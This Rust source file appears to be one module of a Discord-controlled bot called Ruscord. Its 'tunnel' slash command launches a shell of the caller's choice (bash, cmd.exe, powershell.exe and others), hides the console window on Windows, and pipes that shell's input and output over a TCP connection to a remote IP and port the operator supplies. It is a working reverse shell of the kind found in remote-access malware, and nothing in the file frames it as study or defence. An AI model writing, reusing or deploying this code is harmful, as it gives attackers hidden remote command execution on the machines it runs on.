use std::{
	net::{IpAddr, SocketAddr},
	process::Stdio,
};

use tokio::{
	io::{AsyncBufReadExt, AsyncRead, AsyncWriteExt, BufReader, BufWriter},
	net::TcpStream,
	process::Command,
};

use crate::{commands::command_channel_check, RuscordContext, RuscordResult};

#[poise::command(prefix_command, slash_command, check = command_channel_check)]
pub async fn tunnel(
	ctx: RuscordContext<'_>, #[description = "Remote IP"] ip: IpAddr, #[description = "Remote Port"] remote_port: u16,
	#[description = "Command shell to execute"]
	#[autocomplete = "autocomplete_shell"]
	shell: String,
) -> RuscordResult<()> {
	ctx.defer().await?;

	// Set up command process
	let mut cmd = Command::new(shell);
	cmd.stderr(Stdio::piped()).stdout(Stdio::piped()).stdin(Stdio::piped());
	#[cfg(target_os = "windows")]
	// Create new console, hidden window
	cmd.creation_flags(0x08000000 | 0x00000200);

	let mut child = cmd.spawn()?;

	// Set up TCP connection
	let socket_addr = SocketAddr::new(ip, remote_port);
	let tcp_stream = TcpStream::connect(socket_addr).await?;
	let (r, w) = tcp_stream.into_split();
	let (mut stream_reader, mut stream_writer) = (BufReader::new(r), BufWriter::new(w));

	// Set up channels for communication
	let (stream_input_tx, mut stream_input_rx) = tokio::sync::mpsc::channel(1024);
	let (stream_output_tx, mut stream_output_rx) = tokio::sync::mpsc::channel(1024);

	// Get process I/O handles
	let mut stdin = BufWriter::new(child.stdin.take().unwrap());
	let mut stdout = BufReader::new(child.stdout.take().unwrap());
	let mut stderr = BufReader::new(child.stderr.take().unwrap());

	// Handle incoming stream data
	tokio::task::spawn(async move {
		loop {
			let mut buffer = String::new();
			match stream_reader.read_line(&mut buffer).await {
				Ok(0) => {
					child.kill().await.unwrap();
					break;
				}, // EOF
				Ok(bytes) => {
					trace!("Received {} bytes from remote stream", bytes);
					if stream_input_tx.send(buffer).await.is_err() {
						break;
					}
				},
				Err(e) => {
					error!("Error reading from stream: {}", e);
					break;
				},
			}
		}
	});

	// Forward stream data to process stdin
	tokio::task::spawn(async move {
		while let Some(msg) = stream_input_rx.recv().await {
			if let Err(e) = stdin.write_all(msg.as_bytes()).await {
				error!("Error writing to stdin: {}", e);
				break;
			}
			if let Err(e) = stdin.flush().await {
				error!("Error flushing stdin: {}", e);
				break;
			}
		}
	});

	// Handle process output streams
	tokio::task::spawn(async move {
		loop {
			tokio::select! {
				result = process_stream(&mut stdout, "stdout") => {
					if !handle_stream_result(result, &stream_output_tx).await {
						break;
					}
				},
				result = process_stream(&mut stderr, "stderr") => {
					if !handle_stream_result(result, &stream_output_tx).await {
						break;
					}
				}
			}
		}
	});

	// Forward process output to stream
	tokio::task::spawn(async move {
		while let Some(msg) = stream_output_rx.recv().await {
			if let Err(e) = stream_writer.write_all(msg.as_bytes()).await {
				error!("Error writing to stream: {}", e);
				break;
			}
			if let Err(e) = stream_writer.flush().await {
				error!("Error flushing stream: {}", e);
				break;
			}
		}
	});

	ctx.say("Tunnel established").await?;
	Ok(())
}

use utils::*;

mod utils {
	use poise::serenity_prelude::AutocompleteChoice;

	use super::*;

	pub(super) async fn autocomplete_shell(
		_ctx: RuscordContext<'_>, _partial: &str,
	) -> impl Iterator<Item = AutocompleteChoice> {
		let shells = {
			#[cfg(target_family = "unix")]
			{
				["/bin/sh", "/bin/bash", "/bin/zsh", "/bin/fish"]
			}
			#[cfg(target_os = "windows")]
			{
				["cmd.exe", "powershell.exe"]
			}
		};

		shells
			.into_iter()
			.map(|s| AutocompleteChoice::new(s.to_string(), s.to_string()))
	}

	#[inline]
	/// Reads a line from the incoming stream and returns it as a string.
	///
	/// Returns `None` if the stream is closed.
	pub(super) async fn process_stream<T>(
		stream: &mut BufReader<T>, handle: &str,
	) -> RuscordResult<Option<(String, bool)>>
	where
		T: AsyncRead + Unpin,
	{
		let mut buffer = String::new();
		match stream.read_line(&mut buffer).await {
			Ok(0) => Ok(None),
			Ok(bytes) => {
				trace!("Received {} bytes from {}", bytes, handle);
				// Add is_stderr flag
				Ok(Some((buffer, handle == "stderr")))
			},
			Err(e) => {
				error!("Error reading from {}: {}", handle, e);
				Err(e.into())
			},
		}
	}

	#[inline]
	pub(super) async fn handle_stream_result(
		result: RuscordResult<Option<(String, bool)>>, tx: &tokio::sync::mpsc::Sender<String>,
	) -> bool {
		match result {
			Ok(Some((msg, is_stderr))) => {
				let colored_msg = if is_stderr {
					format!("\x1b[31m{}\x1b[0m", msg) // Add red color for stderr
				} else {
					msg
				};
				tx.send(colored_msg).await.is_ok()
			},
			Ok(None) => false,
			Err(_) => false,
		}
	}
}
